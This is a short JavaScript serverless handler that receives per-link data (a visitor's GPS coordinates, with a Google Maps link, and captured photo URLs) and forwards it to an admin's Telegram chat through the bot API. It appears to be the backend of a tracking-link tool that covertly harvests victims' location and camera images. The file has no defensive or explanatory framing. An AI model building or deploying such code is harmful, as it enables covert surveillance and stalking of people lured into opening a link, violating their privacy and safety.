export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;

  // Send data to Telegram
  let message = `📸 New Data Received!\n`;
  message += `Link ID: ${data.linkId}\n`;
  
  if (data.type === 'location' && data.coords) {
    message += `📍 Location: ${data.coords.lat}, ${data.coords.lng}\n`;
    message += `🌐 Maps: https://www.google.com/maps?q=${data.coords.lat},${data.coords.lng}\n`;
  }
  
  if (data.type === 'photo') {
    message += `📷 Photo captured!\n`;
    message += `Photo URL: ${data.photoUrl}\n`;
  }

  message += `⏰ Time: ${new Date().toISOString()}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: ADMIN_ID, text: message })
    });
  } catch (e) {
    console.error('Failed to send to Telegram:', e);
  }

  // Store data as JSON
  res.status(200).json({ success: true });
}
